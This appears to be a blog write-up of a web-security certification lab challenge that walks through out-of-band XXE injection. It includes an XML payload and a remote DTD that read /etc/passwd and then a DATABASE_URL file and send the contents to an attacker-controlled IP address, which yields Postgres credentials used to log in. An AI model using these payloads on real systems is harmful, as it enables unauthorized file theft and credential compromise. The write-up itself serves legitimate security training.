---
title: Challenge 12:When things aren't working, go out of band
date: 2024-05-15 05:04:00 +0800
categories: [Write-Up, CWAE]
tags: [Cert, Write-Up]     # TAG names should always be lowercase
description: This is a detailed writeup created for challenges associated with the Certified Web AppSecurity Expert (CWAE) certification. 
---

# Challenge/Task

1. XXE INJECTION

**Proof-of-Concept (POC):**

There is a field “tags” where the system can query the available tags that has been created before on the website

![POC-otb](/img/cwae/wta1.png){: w="400" h="400" }{: .normal }

This is how the server response when we are calling the /tags endpoint. It will listed all tags that are available. 

![POC-otb](/img/cwae/wta2.png){: w="400" h="400" }{: .normal }

With the same technique XXE before, I try to change the content type of Json to XML format and the server seems accept the format too. You can see how the <tag> there. So maybe we can try XXE attack too ?

![POC-otb](/img/cwae/wta3.png){: w="400" h="400" }{: .normal }

However, when I send the same payload as before for XXE, the server did not respond anything. So, we cannot prove if this is vulnerable or not. We need to use Out of Band Technique.

![POC-otb](/img/cwae/wta4.png){: w="400" h="400" }{: .normal }

Out-of-band XXE (XML External Entity) injection is a technique used to exploit XML processors that support external entities, allowing an attacker to extract data from a server without receiving the actual response in-band with the HTTP response.
I will send malicious XML data to the server, typically containing references to an external entity defined in a Document Type Definition (DTD) file. This DTD file is hosted on our VPS server When the server processes the XML input, it resolves the external entity reference, causing the server to make a request to my controlled server to retrieve the entity content.

Payload sends to server
```jsx
<!DOCTYPE data [<!ENTITY % init SYSTEM "file:///etc/passwd"> 
  <!ENTITY % dtd SYSTEM "http://143.198.205.200:9003/d.dtd"> %dtd;]> 
<data>&send;</data>
```

dtd File created in remote server
```jsx
<!ENTITY % all "<!ENTITY send SYSTEM 'http://143.198.205.200:8090/?collect=%init;'> "> %all;
```
![POC-otb](/img/cwae/wta5.png){: w="400" h="400" }{: .normal }

I start to send the payload to the server. We can see the left side showing us the d.dtd is downloaded by the server. However, the /etc/passwd is not showing inside our listeners. 

![POC-otb](/img/cwae/wta6.png){: w="400" h="400" }{: .normal }

We must step back and see what the problem is here. The dtd file is already correct but somehow no result. Something error at the payload send to the server I guess. Previous challenges, we already performed port scanning to the target. We saw a port that is unknown. Further checking, it is a Postgres DB. So, we must change our payload.

![POC-otb](/img/cwae/wta7.png){: w="400" h="400" }{: .normal }


In PostgreSQL, /tmp/env/DATABASE_URL is likely a reference to a temporary file path where an environment variable called DATABASE_URL might be stored. So, we change the /etc/passwd to /tmp/env/DATABASE_URL and send again the request. You can see, our listener starting to collect the response from server. If you noticed, the line there refer to Postgres username and password. We can try it.. 

![POC-otb](/img/cwae/wta8.png){: w="400" h="400" }{: .normal }

We can now successfully login to the Postgres using the username and password.

![POC-otb](/img/cwae/wta9.png){: w="400" h="400" }{: .normal }
